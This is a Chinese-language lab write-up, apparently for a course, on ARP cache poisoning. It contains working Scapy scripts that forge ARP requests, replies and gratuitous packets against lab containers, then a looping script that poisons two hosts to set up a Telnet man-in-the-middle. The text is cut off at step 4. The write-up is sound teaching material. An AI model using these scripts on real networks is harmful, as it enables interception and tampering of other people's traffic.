---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
comments: true
---  

# ARP Attack

## 任务 1：ARP 缓存中毒攻击

### 任务 1.A（使用 ARP 请求）

在容器 M 中运行 `ifconfig` 查看 MAC 地址：

![](../../../../../assets/Pasted%20image%2020250422221828.png)

同理，获得容器 A 的 MAC 地址：

![](../../../../../assets/Pasted%20image%2020250422222133.png)

在容器 M 中编写 Python 代码：

```python title="ARP_Request.py"
from scapy.all import *

A_IP = "10.9.0.5"
A_MAC = "ea:9c:17:47:e2:9e"
B_IP = "10.9.0.6"
M_MAC = "8e:ff:11:30:f1:57"

pkt = Ether(src = M_MAC, dst = A_MAC) / ARP(op = 1, psrc = B_IP, hwsrc = M_MAC, pdst = A_IP, hwdst = A_MAC)
sendp(pkt)
```

运行代码，在容器 A 中运行 `arp -n` 查看 ARP 缓存：

![](../../../../../assets/Pasted%20image%2020250422223002.png)

可以看到 B 的 IP 地址被映射到了 M 的 MAC 地址上，攻击成功
***
### 任务 1.B（使用 ARP 响应）

- 情景 1：B 的 IP 地址已经存在于 A 的缓存中

首先，我们在 B 中 `ping` A 更新 ARP 缓存，此时在 A 上看到：

![](../../../../../assets/Pasted%20image%2020250422223318.png)

在容器 M 中编写 Python 代码：

```python title="ARP_Response.py"
rom scapy.all import *

A_IP = "10.9.0.5"
A_MAC = "ea:9c:17:47:e2:9e"
B_IP = "10.9.0.6"
M_MAC = "8e:ff:11:30:f1:57"

pkt = Ether(src = M_MAC, dst = A_MAC) / ARP(op = 2, psrc = B_IP, hwsrc = M_MAC, pdst = A_IP, hwdst = A_MAC)
sendp(pkt)
```

运行代码，在容器 A 中运行 `arp -n` 查看 ARP 缓存：

![](../../../../../assets/Pasted%20image%2020250422224410.png)

可以看到缓存仍然被更新，攻击成功

- 情景 2：B 的 IP 地址不在 A 的缓存中

首先删除 ARP 中关于 B 的记录：

![](../../../../../assets/Pasted%20image%2020250422224557.png)

再次在 M 中运行代码，在容器 A 中运行 `arp -n` 查看 ARP 缓存：

![](../../../../../assets/Pasted%20image%2020250422224646.png)

可以看到 B 的 IP 地址不在 A 的缓存中，这说明 ARP 响应只能更新缓存内容，并不能新建缓存内容
***
### 任务 1.C（使用 ARP 免费消息）

- 情景 1：B 的 IP 地址已经存在于 A 的缓存中

和上面的一样，首先，我们在 B 中 `ping` A 更新 ARP 缓存，并在 M 中编写 Python 代码：

```python title="ARP_Gratuitous.py"
from scapy.all import *

B_IP = "10.9.0.6"
M_MAC = "8e:ff:11:30:f1:57"
broadcast = "ff:ff:ff:ff:ff:ff"

pkt = Ether(src = M_MAC, dst = broadcast) / ARP(op = 1, psrc = B_IP, hwsrc = M_MAC, pdst = B_IP, hwdst = broadcast)
sendp(pkt)
```

运行代码，在容器 A 中运行 `arp -n` 查看 ARP 缓存：

![](../../../../../assets/Pasted%20image%2020250422225649.png)

可以看到缓存仍然被更新，攻击成功

- 情景 2：B 的 IP 地址不在 A 的缓存中

删除 ARP 中关于 B 的记录后，再次运行代码，并在容器 A 中运行 `arp -n` 查看 ARP 缓存:

![](../../../../../assets/Pasted%20image%2020250422230000.png)

B 的 IP 地址仍然没在 A 的缓存当中
***
## 任务 2：使用 ARP 缓存中毒攻击在 Telnet 实施中间人攻击

### 步骤 1（发起 ARP 缓存中毒攻击）

在容器 M 中对 A 和 B 都进行 ARP 缓存中毒攻击，且设置每 5 秒 1 次：

```python title="ARP_Poison.py"
from scapy.all import *

A_IP = "10.9.0.5"
A_MAC = "ea:9c:17:47:e2:9e"
B_IP = "10.9.0.6"
B_MAC = "16:4c:eb:48:1a:7d"
M_MAC = "8e:ff:11:30:f1:57"

pktA = Ether(src = M_MAC, dst = A_MAC) / ARP(op = 2, psrc = B_IP, hwsrc = M_MAC, pdst = A_IP, hwdst = A_MAC)
pktB = Ether(src = M_MAC, dst = B_MAC) / ARP(op = 2, psrc = A_IP, hwsrc = M_MAC, pdst = B_IP, hwdst = B_MAC)

while True:
	sendp(pktA, count = 1)
	sendp(pktB, count = 1)
	time.sleep(5)
```

运行程序，通过 `arp -n` 查看运行程序前后 A 和 B 的 ARP 缓存变化：

![](../../../../../assets/Pasted%20image%2020250422232445.png)

![](../../../../../assets/Pasted%20image%2020250422232512.png)

攻击成功
***
### 步骤 2（测试）

首先关闭容器 M 的 IP 转发：

![](../../../../../assets/Pasted%20image%2020250422232729.png)

再次运行程序，并在主机 A 和 B 之间相互 ping：

![](../../../../../assets/Pasted%20image%2020250422232928.png)

![](../../../../../assets/Pasted%20image%2020250422232938.png)

可以发现 ping 不通，在宿主机运行 tshark 监听容器网络：

![](../../../../../assets/Pasted%20image%2020250422233151.png)

这是因为关闭 IP 转发（即关闭将接收到的数据包从一个网络接口转发到另一个网络接口的功能），当 B ping A 时，数据包到达 M，但因为 M 发现目标 IP 并不是自己的 IP，且未开启 IP 转发，就会将数据包丢弃，B 就自然而然并不会收到来自 A 的数据包
***
### 步骤 3（开启 IP 转发）

在容器 M 中开启 IP 转发：

![](../../../../../assets/Pasted%20image%2020250422234350.png)

再次运行程序，并在主机 A 和 B 之间相互 ping：

![](../../../../../assets/Pasted%20image%2020250422234828.png)

![](../../../../../assets/Pasted%20image%2020250422234842.png)

这时候可以 ping 通了
***
### 步骤 4（实施中间人攻击）

保持